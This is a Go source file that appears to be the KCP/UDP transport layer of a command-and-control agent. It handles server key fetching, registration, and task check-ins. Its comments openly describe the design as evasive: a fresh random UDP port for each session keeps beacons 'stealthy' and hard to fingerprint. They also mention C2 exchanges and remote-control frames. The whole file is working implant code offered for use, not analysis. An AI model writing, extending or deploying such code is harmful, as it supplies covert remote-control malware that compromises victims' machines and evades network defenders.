package transport

// KCPTransport communicates with the server over KCP/UDP — a reliable,
// low-latency transport that avoids TCP slow-start. It implements the same
// Transport interface as TCPTransport (identical packet-level handshake and
// polling); only the dial layer differs.
//
// Like TCPTransport it uses short-lived sessions: every register/checkin dials
// a fresh KCP session from a random ephemeral UDP port and closes it right
// after. This is what keeps UDP stealthy — a long-lived socket with a fixed
// source port and periodic beacons is trivially fingerprintable. The anti-flood
// burden sits with the agent's exponential backoff on failures (see main.go).

import (
	"fmt"
	"net"
	"time"

	"github.com/xtaci/kcp-go/v5"

	"github.com/user/wisp/shared/protocol"
)

// KCPTransport manages UDP/KCP communication with the server.
type KCPTransport struct {
	Host      string
	Port      int
	AgentID   string
	Keys      *protocol.SessionKeys
	RSAPubPEM string

	seq uint64 // monotonic checkin counter (replay protection)
}

// NewKCPTransport creates a KCP transport for the given server endpoint.
func NewKCPTransport(host string, port int, agentID, rsapubPEM string) *KCPTransport {
	return &KCPTransport{Host: host, Port: port, AgentID: agentID, RSAPubPEM: rsapubPEM}
}

// fetchServerKey requests the RSA public key from the server (CLI/dev mode).
func (t *KCPTransport) fetchServerKey() error {
	conn, err := t.dial()
	if err != nil {
		return err
	}
	defer conn.Close()
	key, err := fetchKeyOnConn(conn)
	if err != nil {
		return err
	}
	t.RSAPubPEM = key
	return nil
}

// Register performs the initial agent registration with the server. The session
// is closed once the handshake completes.
func (t *KCPTransport) Register(regData []byte) error {
	if t.RSAPubPEM == "" {
		if err := t.fetchServerKey(); err != nil {
			return fmt.Errorf("fetch server key: %w", err)
		}
	}

	conn, err := t.dial()
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()

	keys, err := registerOnConn(conn, t.RSAPubPEM, regData)
	if err != nil {
		return err
	}
	t.Keys = keys
	return nil
}

// Checkin sends a heartbeat and retrieves pending tasks over a fresh short-lived
// KCP session. Any failure maps to ErrReauth so the caller re-registers.
func (t *KCPTransport) Checkin(results []byte) ([]byte, error) {
	conn, err := t.dial()
	if err != nil {
		return nil, ErrReauth
	}
	defer conn.Close()

	data, err := checkinOnConn(conn, t.AgentID, &t.seq, t.Keys, results)
	if err != nil {
		return nil, ErrReauth
	}
	return data, nil
}

// dial opens a fresh KCP session. The session is set to fast mode so C2
// exchanges stay snappy even on lossy links.
func (t *KCPTransport) dial() (net.Conn, error) {
	addr := net.JoinHostPort(t.Host, fmt.Sprintf("%d", t.Port))
	sess, err := kcp.DialWithOptions(addr, nil, 0, 0)
	if err != nil {
		return nil, fmt.Errorf("kcp dial: %w", err)
	}
	tuneKCP(sess)
	_ = sess.SetDeadline(time.Now().Add(10 * time.Second))
	return sess, nil
}

// tuneKCP switches a KCP session into fast mode (nodelay=1, 10ms interval,
// fast resend, no congestion control). Large windows keep high-res
// remote-control frames flowing without blocking the writer.
func tuneKCP(conn net.Conn) {
	sess, ok := conn.(*kcp.UDPSession)
	if !ok {
		return
	}
	sess.SetNoDelay(1, 10, 2, 1)
	sess.SetStreamMode(true)
	sess.SetWindowSize(2048, 2048)
	sess.SetReadBuffer(8 << 20)
	sess.SetWriteBuffer(8 << 20)
}
